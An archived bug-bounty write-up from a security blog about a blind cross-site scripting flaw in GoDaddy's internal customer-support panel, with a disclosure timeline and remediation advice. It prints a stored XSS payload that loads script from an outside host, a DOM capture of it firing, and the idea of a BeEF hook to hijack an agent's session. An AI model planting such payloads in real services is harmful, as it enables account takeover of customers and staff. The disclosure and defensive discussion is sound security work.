---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-05-08_poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss.md
original_filename: 2016-05-08_poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss.md
title: Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS
category: documents
detected_topics:
- xss
- sso
- command-injection
- automation-abuse
- api-security
- cloud-security
tags:
- imported
- documents
- xss
- sso
- command-injection
- automation-abuse
- api-security
- cloud-security
language: en
raw_sha256: 40fa11c39be684154b96b9caf3095a2b80822b5ae46f579fd23588e3655ffa8e
text_sha256: 01ebf68554fae0ff9a4e30343580df144730fbeb5851286030d1e0adb9827b68
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-05-08_poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss.md
- Source Type: markdown
- Detected Topics: xss, sso, command-injection, automation-abuse, api-security, cloud-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `40fa11c39be684154b96b9caf3095a2b80822b5ae46f579fd23588e3655ffa8e`
- Text SHA256: `01ebf68554fae0ff9a4e30343580df144730fbeb5851286030d1e0adb9827b68`


## Content

---
title: "Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS"
page_title: "Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS – The Hacker Blog"
url: "https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/index.html"
final_url: "https://thehackerblog.com/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/index.html"
authors: ["Matthew Bryant (@IAmMandatory)"]
programs: ["GoDaddy"]
bugs: ["Blind XSS"]
publication_date: "2016-05-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6299
---

# Poisoning the Well – Compromising GoDaddy Customer Support With Blind XSS

![well](/wp-content/uploads/2016/05/well.jpg)

This is the first part of a series of stories of compromising companies via blind cross-site scripting. As companies fix the issues and allow me to disclose them, I will post them here.

Blind cross-site scripting (XSS) is an often-missed class of XSS which occurs when an XSS payload fires in a browser other than the attacker’s/pentester’s. This flavour of XSS is often missed by penetration testers due to the [standard alert box approach ](https://www.google.com/about/appsecurity/learning/xss/#ManualTests)being a [limited methodology for finding these vulnerabilities](https://thehackerblog.com/xss-hunter-a-modern-approach-to-testing-for-cross-site-scripting-xss/). When your payloads are all <script>alert(1)</script> you’re making the assumption that the XSS will fire in your browser, when it’s likely it will fire in other places and in other browsers. Without a payload that notifies you regardless of the browser it fires in, you’re probably missing out on the biggest vulnerabilities.

### Poisoning the Well

One of the interesting things about using a blind XSS tool (in my case I’m using [XSS Hunter](https://xsshunter.com/)) is that you can sprinkle your payloads across a service and wait until someone else triggers them. The more you test for blind XSS the more you realize the game is about “poisoning” the data stores that applications read from. For example, a users database is likely read by more than just the main web application. There is likely log viewing apps, administrative panels, and data analytics services which all draw from the same end storage. All of these services are just as likely to be vulnerable to XSS if not more because they are often not as polished as the final web service that the end customer uses. To make a physical comparison, blind XSS payloads act more like mines which lie dormant until someone triggers them.

![](/wp-content/uploads/2016/05/mines.jpg)

### Yes, my name is <script src=//y.vg></script>.

GoDaddy is a perfect example of the above. While using GoDaddy I noticed that my first and last name could be set to an XSS payload. I opted to use my generic for both fields:

[![](/wp-content/uploads/2016/05/godaddy_xss_profile.png)](/wp-content/uploads/2016/05/godaddy_xss_profile.png)Humorously, I had completely forgotten that I had done so until I later had a problem with one of my domains. Later on I called GoDaddy’s customer support to try to get a domain transferred to a different registrar. The agent appeared to be having trouble looking up my account due to their systems “experiencing issues”. It was then my phone vibrated twice indicating I had just gotten two emails in rapid succession. As it turns out, those emails were notifications that my previously planted XSS payloads had fired:

[![Jackpot!](/wp-content/uploads/2016/05/xsshunter_godaddy_fire.png)](/wp-content/uploads/2016/05/xsshunter_godaddy_fire.png)It appears that GoDaddy’s internal customer support panel was indeed vulnerable to XSS! I made an excuse about having to deal with a personal matter and ended the support call. After investigating the report generated by XSS Hunter, the DOM capture gave away why the support rep was having troubles:
  
  
  <script type="text/javascript">
  var CRM = CRM || {};
  CRM.Shopper = CRM.Shoper || { };
  CRM.Shopper.JSON = {"shopperId":"34729611","privateLabelId":1,"accountInfo":{"accountUsageTypeId":0,"emailTypeID":2},"personalInfo":{"firstName":"\"><script src=https://y.vg></script><script src="https://img4.wsimg.com/starfield/sf.core/v1.8.5/sf.core.js" async="" charset="utf-8"></script></head><body>","lastName":"\"><script src="https://y.vg"></script><iframe scrolling="no" style="visibility: hidden; position: absolute; top: -10000px; left: -10000px;" height="889" width="1264"></iframe>","company":"\"><script src="https://y.vg"></script></body>

As can be seen in the above DOM capture, my XSS payload borked the JSON displayed in the webpage body and escaped the 

### Impact

Using this vulnerability I could perform any action as the GoDaddy customer rep. This is a bad deal because GoDaddy representatives have the ability to do basically anything with your account. On other support calls with GoDaddy my agent was able to do everything from modifying account information, to transferring domain names, to deleting my account altogether. In a real attack scenario, the next step for exploitation would be to inject a proper [BeEF hook into the agent’s browser](http://beefproject.com/) to ride their session (using XSS Hunter’s JavaScript chainload functionality) and use the support website as them. However, since I’m not malicious I opted to report the issue to them shortly after finding it (see below Disclosure Timeline).

### Blind XSS Remediation – Keeping the Well Clean

This story brings up an interesting point about XSS remediation. While the standard remediation for XSS is generally [contextually-aware output encoding](https://www.google.com/about/appsecurity/learning/xss/#TemplateSystems), you can actually get huge security gains from preventing the payloads from being stored at all. When you do proper output encoding, you have to do it on every system which pulls data from your data store. However, if you simply ensure that the stored data is clean you can prevent exploitation of many systems because the payload would never be able to be stored in the first place. Obviously, ideally you would have both, but for companies with many services drawing from the same data sources you can get a lot of win with just a little filtering. This is the approach that GoDaddy took for remediation, likely for the same reasons.

### Disclosure Timeline

###### _*I apologize if some of these dates are a day or two off as Cobalt (the bug bounty service GoDaddy uses) has awful timestamps which round up to the nearest month if you go far enough back. For this reason I don’t have exact timestamps for all of this, but I try to be as close as possible._

12/28/15 – Emailed [[email protected]](/cdn-cgi/l/email-protection) about reporting the security vulnerability.

12/29/15 – After some research, emailed [[email protected]](/cdn-cgi/l/email-protection) instead about reporting the issue.

12/30/15 – Invited to GoDaddy’s private bug bounty program.

12/30/15 – Reported vulnerability via Cobalt’s bug bounty web service.

02/06/16 – GoDaddy closed issue as a duplicate stating the following:

_“This is actually a known issue and we are working to resolve it._

_Also keep in mind that our bug bounty only covers www.godaddy.com and sso.godaddy.com. crm.int.godaddy.com would be considered out of scope. But since this has already been reported since you need to create a username/password at sso.godaddy.com, I am not counting it as out of scope; just a duplicate.”_

02/06/16 – Requested public disclosure after three months pass, due to high severity of issue (and the fact that it was known to them before I reported it, making it unclear how long the issue has existed).

02/06/16 – GoDaddy responds with the following:

_“We appreciate you letting us know of the severity of this issue. We are definitely working on this, and when we fix the issue, we will let you know the status of this. You may want to follow up in a few weeks with us._

_Since you have now heard from us, we respectfully ask that you do not disclose this until we have fixed it. Please keep in mind that you agreed to the Cobalt/GoDaddy terms of agreement when you signed up for our Bug Bounty. The agreement states:_

_“You may disclose vulnerabilities only after proper remediation has occurred and may not disclose any confidential information without prior written consent.”_

_The full agreement can be found at: https://cobalt.io/godaddy-beta”_

02/07/16 – Agree to not disclose until the issue is fixed.

02/07/16 – 04/07/16 – Multiple pings to the GoDaddy bug bounty team asking on the status of the issue.

04/11/16 – After waiting ~3 months I respond with the following:

_“Hey @[REDACTED] checking in on an update. I’m a little disappointed in the response time on this because of how critical this vulnerability is. I’m moving my domains off of GoDaddy this week (since they could all be stolen/accessed using this issue) but for other GoDaddy users this is still outstanding critical issue that affects them. I’ve waited over three months so far for a fix so I feel giving this one more month until public disclosure takes place is fair (this is more time than Google’s Project Zero gives: http://googleprojectzero.blogspot.com/2015/02/feedback-and-data-driven-updates-to.html). To clarify, the reason behind disclosure is not to extort (I don’t care about reward) but only to make other GoDaddy users aware of the outstanding issue (and also to incentivize a fix)._

_I am aware this violates the Terms of Service of Cobalt.io am not super concerned about being banned as this is the only bug bounty I’ve participated in which is hosted here._

_Let me know your thoughts on this timeline. Thanks.”_

04/13/16 – Pinged GoDaddy to ensure they got the above message.

04/13/16 – GoDaddy responds with:

_“Hi Mandatory, we have received your reply and I am escalating this issue internally. As soon as I hear from the development team, I will reply with details and hopefully a timeline for remediation.”_

04/20/16 – Checked in on fix status.

04/20/16 – GoDaddy responds with:

_“This issue has involved several teams from the front and backend. They have pushed out some minor changes but are still working on fixing the entire issue from front to back. Feel free to follow up in a few days or some time next week. Hopefully we’ll have fixed the issue completely.”_

04/25/16 – GoDaddy responds with:

_“Just wanted to update you that our developers have deployed code changes which should now prevent XSS from happening on account usernames and account profile information such as your first and last name. Feel free to test and let us know if you are still able to replicate the issue.”_

04/27/16 – Confirmed that you can no longer set your profile information to an XSS payload. Fixing the root cause.

[blind xss](/tags#blind xss "Pages tagged blind xss")[godaddy blind xss](/tags#godaddy blind xss "Pages tagged godaddy blind xss")[godaddy customer support hacked](/tags#godaddy customer support hacked "Pages tagged godaddy customer support hacked")[godaddy hacked](/tags#godaddy hacked "Pages tagged godaddy hacked")[godaddy xss](/tags#godaddy xss "Pages tagged godaddy xss")[well poisoning](/tags#well poisoning "Pages tagged well poisoning")[xss](/tags#xss "Pages tagged xss")[xss hunter](/tags#xss hunter "Pages tagged xss hunter")[xsshunter](/tags#xsshunter "Pages tagged xsshunter") Matthew Bryant (mandatory)

  * [__Like](https://www.facebook.com/sharer/sharer.php?u=/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/ "Share on Facebook")
  * [__Tweet](https://twitter.com/intent/tweet?text=/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/ "Share on Twitter")
  * [__+1](https://plus.google.com/share?url=/poisoning-the-well-compromising-godaddy-customer-support-with-blind-xss/ "Share on Google Plus")

[About the Author](https://thehackerblog.com)

### Matthew Bryant (mandatory)

![Matthew Bryant \(mandatory\)](/images/avatar.jpg)

Security researcher who needs to sleep more. Opinions expressed are solely my own and do not express the views or opinions of my employer.

  * [__](https://github.com/mandatoryprogrammer)
  * [__](https://www.linkedin.com/in/matthew-bryant-a9403289/)

[Follow @mandatoryprogrammer](https://github.com/mandatoryprogrammer)  
[Follow @IAmMandatory](https://twitter.com/IAmMandatory)

[Read More](/xss-hunter-a-modern-approach-to-testing-for-cross-site-scripting-xss/)

### ["Zero-Days" Without Incident - Compromising Angular via Expired npm Publisher Email Domains](/zero-days-without-incident-compromising-angular-via-expired-npm-publisher-email-domains-7kZplW4x/)

**NOTE:** *If you're just looking for the high level points, see the"[The TL;DR Summary & High-LevelPoints](#the-tldr-summary--high-level...… [Continue reading](/zero-days-without-incident-compromising-angular-via-expired-npm-publisher-email-domains-7kZplW4x/)

#### [Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass (~15.5 Million Affected)](/video-download-uxss-exploit-detailed/ "Video Downloader and Video Downloader Plus Chrome Extension Hijack Exploit - UXSS via CSP Bypass \(~15.5 Million Affected\)")

Published on February 22, 2019

#### [Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions](/kicking-the-rims-a-guide-for-securely-writing-and-auditing-chrome-extensions/ "Kicking the Rims – A Guide for Securely Writing and Auditing Chrome Extensions")

Published on June 12, 2018
